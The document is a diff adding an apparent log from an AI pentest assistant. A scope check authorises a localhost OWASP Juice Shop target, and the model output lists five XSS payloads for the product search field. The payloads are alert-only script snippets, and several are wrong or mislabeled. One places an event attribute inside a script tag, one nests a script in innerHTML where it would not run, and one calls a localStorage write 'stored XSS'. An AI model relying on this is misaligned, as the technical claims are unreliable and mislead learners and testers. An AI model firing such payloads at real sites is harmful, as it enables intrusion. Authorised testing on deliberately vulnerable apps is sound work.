@@ -1,0 +1,42 @@
+QUERY: List common XSS payloads to try against the Juice Shop product search feature.
+
+SCOPE DECISION: ALLOW
+REASON: all targets authorized: ['127.0.0.1:3000', 'localhost:3000']
+TARGETS FOUND: ['127.0.0.1:3000', 'localhost:3000']
+
+MODEL OUTPUT:
+ Given the context, the goal is to perform a retrieval-augmented reconnaissance on the OWASP Juice Shop, which is an intentionally vulnerable web application. One common attack vector in such applications is Cross-Site Scripting (XSS). Here are some common XSS payloads that could be tried against the Juice Shop product search feature:
+
+1. Basic XSS (Non-persistent):
+   ```
+   <script>alert("XSS");</script>
+   ```
+
+2. Reflected XSS with event attributes:
+   ```
+   <script>onmouseover="alert('XSS')"></script>
+   ```
+
+3. Reflected XSS with JavaScript URL encoding:
+   ```
+   <script>alert(decodeURIComponent('XSS'))</script>
+   ```
+
+4. DOM-based XSS (Non-persistent) using `innerHTML`:
+   ```
+   <script>
+      document.getElementById('product-search').innerHTML = '<script>alert("XSS")</script>';
+   </script>
+   ```
+
+5. Persistent XSS (Stored XSS) payload:
+   ```
+   <script>
+      function storeXSS() {
+          localStorage.setItem('xss', 'alert("XSS")');
+      }
+      storeXSS();
+   </script>
+   ```
+
+These payloads can be injected into the product search field to check if the application is vulnerable to XSS attacks. However, it's important to note that responsible disclosure practices should be followed while testing applications for vulnerabilities. Always ensure you have proper authorization and that your testing does not cause harm to the application or its users.
